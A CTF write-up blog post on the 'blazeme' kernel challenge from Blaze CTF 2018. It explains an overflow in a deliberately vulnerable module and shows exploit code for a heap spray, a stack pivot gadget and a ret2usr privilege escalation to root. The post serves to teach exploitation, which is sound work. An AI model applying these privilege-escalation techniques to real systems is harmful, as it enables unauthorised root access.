---
layout: post
title: blazeme - Blaze CTF 2018
date: '2018-04-25 16:30:00'
---

> Kernel exploitation challenge!
> 
> ssh blazeme@18.222.40.104 password: guest
> 
> Download [here](/assets/blaze18/blazeme.tar.gz) (6 MB)
> 
> The flag in this archive is not the real flag. It's there to make you feel good when your exploit works locally.
> 
> Author: crixer

*420 points, 14 Solves, pwn*


We are given the source to a kernel module `blazeme` which creates a char device at `/dev/blazeme` and can be opened, closed, read, and written to. It allows us to write up to `#define KBUF_LEN (64)` bytes into a global buffer `kbuf` which created with kmalloc, then read back up to 64 bytes. It also `strncat`'s `Hello` and the supplied data into a 512 stack buffer and prints it using `printk`, which we can see using `dmesg`.

```bash
$ echo testing > /dev/blazeme
$ dd if=/dev/blazeme bs=10 count=1
testing
$ dmesg | tail -n 1
Hello testing
```

The issue lies in the contatination of the two bits of data:
```c
char str[512] = "Hello ";

if (kbuf != NULL) {
    strncat(str, kbuf, strlen(kbuf));
    printk(KERN_INFO "%s", str);
}
```

Although `kbuf` is only ever 64 bytes long, the amount that is copied is determined by `strlen(kbuf)`. The linux kernel uses the [SLUB allocator ](https://lwn.net/Articles/229984/) by default:

> In the SLUB allocator, a slab is simply a group of one or more pages neatly packed with objects of a given size. There is no metadata within the slab itself, with the exception that free objects are formed into a simple linked list.

This means that if we can allocate a bunch of 64 byte slabs, and fill then with anything but nulls, we can cause `strlen(kbuf)` to be greater that 512 and we have a stack overflow.

As kernel addresses start from `0xffffffff80000000`,  we can create a rop chain containing no null bytes that can be used to smash the stack. Thankfully there was no kaslr/smep/smap so we have fixed kernel addresses and can use `ret2usr` to redirect the control flow to user space. 

```bash
$ cat /proc/cpuinfo | grep flags
flags		: fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm nopl cpuid pni cx16 hypervisor lahf_lm svm 3dnowprefetch retpoline rsb_ctxsw vmmcall
```

After using [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) to extract the `vmlinux` from the provided `bzImage`, I fired up [ropper](https://github.com/sashs/Ropper) and looked for a stack pivot (xchg, mov, etc) of which there were hundres. I chose `0xffffffff8109c604: mov esp, 0x1740000; ret;` as it would allow me to map a fixed location in user space and build a full rop chain there.

As `Hello ` is also prepended to the data, my payload started with 2 padding bytes to align the stack, followed by 8 of my pivot gadgets:

```c
unsigned long pivot[8];
for (int i = 0; i < 8; ++i) {
  pivot[i] = 0xffffffff8109c604ull;  // mov esp, 0x1740000; ret;
}

char payload[64];
strncpy(payload, "AA", 2);
strncpy(&payload[2], (const char *)pivot, 64);
```

Spraying this around wildly in a loop should hopefully overwrite a saved RIP at some point, moving the stack and giving us control.

```c
int fd = open("/dev/blazeme", O_RDWR);
for (;;) {
  write(fd, payload, 64);;
}
```

So what we need to do now, is make ourselves root by calling `commit_creds(prepare_kernel_cred(0));` and then return from the kernel space to the usersspace process using `swapgs` and `iretq` with the required values on the stack, then spawn a shell. We map our fake stack in to cover `0x1740000` and place our return address in the correct location.

```c
static void kernel_payload() {
  escalate_privs();
  restore_state();
}

int main() {
  unsigned long *fake_stack = mmap((void *)0x1700000, 0x1000000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x32 | MAP_POPULATE | MAP_FIXED | MAP_GROWSDOWN, -1, 0);
  fake_stack[0x40000 / 8] = (unsigned long)kernel_payload;
```

The save and restore methods were taken straight from http://cyseclabs.com/slides/smep_bypass.pdf and most of the rest from the references below. 

The qemu machine had networking enabled, so after statically compiling our exploit `gcc -static -O2 -Wall exploit.c -o exploit` we can `wget` it to the machine and run it.

```bash
$ ./exploit
Spawning shell
$ id
uid=0(root) gid=0(root)
```

[Full exploit code here.](https://github.com/vakzz/ctfs/blob/master/Blaze2018/blazeme/solv.c)


<hr>
### References
Here's a bunch of stuff by [Vitaly Nikolenko](https://twitter.com/vnik5287) which was  great help in learning about kernel exploits:

* <http://cyseclabs.com/slides/smep_bypass.pdf>
* <https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)>
* <https://github.com/vnik5287/kernel_rop/blob/master/rop_exploit.c>
* <https://www.youtube.com/watch?v=6hVHQZ75TV8>
